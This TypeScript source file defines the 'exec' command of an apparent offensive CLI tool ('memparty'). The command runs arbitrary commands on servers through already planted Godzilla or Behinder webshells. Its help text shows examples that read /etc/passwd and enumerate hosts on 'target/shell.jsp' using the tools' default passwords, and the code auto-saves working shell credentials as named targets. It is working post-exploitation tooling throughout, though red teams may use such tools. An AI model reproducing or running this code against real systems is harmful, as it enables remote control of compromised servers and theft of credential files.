import { Command, Option } from "commander";

import { logInfo, reportError, type GlobalOptions } from "../cli-context.js";
import { execBehinder } from "../connect/behinder.js";
import { execGodzilla, type GodzillaExecOptions } from "../connect/godzilla.js";
import type { CommonConnectOptions, ExecResult } from "../connect/types.js";
import { logOp, truncateOutput } from "../core/oplog.js";
import { autoSaveShell, resolveConnection } from "../core/targets.js";

interface ExecCmdOptions extends GlobalOptions {
  url?: string;
  tool?: string;
  pass?: string;
  key?: string;
  cmd?: string;
  os?: "auto" | "windows" | "linux";
  headerName?: string;
  headerValue?: string;
  header?: string[];
  insecure?: boolean;
  json?: boolean;
  save?: boolean;
}

function parseExtraHeaders(lines: string[] | undefined): Record<string, string> {
  const headers: Record<string, string> = {};
  for (const line of lines ?? []) {
    const idx = line.indexOf(":");
    if (idx <= 0) {
      throw new Error(`invalid header ${JSON.stringify(line)}, expected "Name: value"`);
    }
    headers[line.slice(0, idx).trim()] = line.slice(idx + 1).trim();
  }
  return headers;
}

export function registerExecCommand(program: Command): void {
  program
    .command("exec")
    .description(
      "Execute a command on a deployed webshell (Godzilla / Behinder) and print its output",
    )
    .argument("[name]", "saved target name (see 'memparty list')")
    .option("-u, --url <url>", "URL of the deployed shell (or give a saved target name)")
    .addOption(
      new Option("-t, --tool <tool>", "shell tool").choices(["godzilla", "behinder"]),
    )
    .requiredOption("--cmd <command>", "command line to execute on the target")
    .option("--pass <pass>", "password (godzilla default: pass; behinder default: rebeyond)")
    .option("--key <key>", "godzilla key", "key")
    .addOption(
      new Option("--os <family>", "godzilla: remote OS for the shell wrapper")
        .choices(["auto", "windows", "linux"])
        .default("auto"),
    )
    .option(
      "--header-name <name>",
      "gate header name reported by gen (shellToolConfig.headerName)",
    )
    .option(
      "--header-value <value>",
      "gate header value reported by gen (shellToolConfig.headerValue)",
    )
    .option("-H, --header <line...>", 'extra request header, e.g. -H "Cookie: a=b"')
    .option("-k, --insecure", "skip TLS certificate verification")
    .option("--json", "output raw JSON")
    .option("--no-save", "do not auto-save the target after a successful exec")
    .addHelpText(
      "after",
      `
Examples:
  $ memparty exec -u http://target/shell.jsp -t godzilla --pass pass --key key \\
      --header-value my-secret-token --cmd "whoami"
  $ memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond \\
      --header-value my-secret-token --cmd "cat /etc/passwd"
  $ memparty exec web222 --cmd "whoami"            # saved target, see 'memparty list'
  $ memparty exec -u http://target/shell.jsp -t godzilla --os windows \\
      --cmd "ipconfig /all" --json

Note: godzilla auto-detects the remote OS (one extra request) to pick
cmd.exe vs /bin/sh — pass --os to skip the detection. Behinder detects
the OS inside its payload, so --os does not apply.
`,
    )
    .action(async (name: string | undefined, opts: ExecCmdOptions, cmd: Command) => {
      const globals = cmd.optsWithGlobals() as GlobalOptions & { timeout?: string };
      const timeoutMs = Number.parseInt(globals.timeout ?? "30000", 10);

      let conn;
      try {
        conn = resolveConnection(name, {
          url: opts.url,
          tool: opts.tool,
          pass: opts.pass,
          key: opts.key,
          headerName: opts.headerName,
          headerValue: opts.headerValue,
          extraHeaders: parseExtraHeaders(opts.header),
          insecure: opts.insecure,
        });
      } catch (err) {
        reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
        process.exitCode = 1;
        return;
      }

      const common: CommonConnectOptions = {
        headerName: conn.headerName,
        headerValue: conn.headerValue,
        extraHeaders: conn.extraHeaders,
        timeoutMs,
        insecure: conn.insecure,
      };

      let result: ExecResult;
      switch (conn.tool) {
        case "godzilla": {
          const gdzOpts: GodzillaExecOptions = { ...common, os: opts.os };
          result = await execGodzilla(
            conn.url,
            conn.pass ?? "pass",
            conn.key ?? "key",
            opts.cmd!,
            gdzOpts,
          );
          break;
        }
        case "behinder":
          result = await execBehinder(conn.url, conn.pass ?? "rebeyond", opts.cmd!, common);
          break;
        default:
          process.stderr.write(
            `Error: exec supports godzilla | behinder (got ${String(conn.tool)})\n`,
          );
          process.exitCode = 1;
          return;
      }

      // a successful exec proves the credentials — keep them as a named target
      let savedAs: string | undefined;
      if (result.ok && conn.targetName === undefined && opts.save !== false) {
        savedAs = autoSaveShell(conn);
        conn.targetName = savedAs;
      }

      const truncated = result.output !== undefined ? truncateOutput(result.output) : null;
      logOp({
        category: "exec",
        action: "exec",
        targetName: conn.targetName,
        url: conn.url,
        tool: conn.tool,
        ok: result.ok,
        durationMs: result.durationMs,
        command: opts.cmd,
        output: truncated?.output,
        outputTruncated: truncated?.truncated || undefined,
        error: result.error,
      });

      if (opts.json) {
        process.stdout.write(`${JSON.stringify({ ...result, savedAs }, null, 2)}\n`);
      } else if (result.ok) {
        process.stdout.write(result.output ?? "");
        if (result.output && !result.output.endsWith("\n")) process.stdout.write("\n");
        if (savedAs) logInfo(`saved as '${savedAs}' (use --no-save to skip)`);
      } else {
        process.stderr.write(`FAIL ${result.tool} ${result.url}\n     ${result.error ?? ""}\n`);
      }
      if (!result.ok) {
        process.exitCode = 1;
      }
    });
}
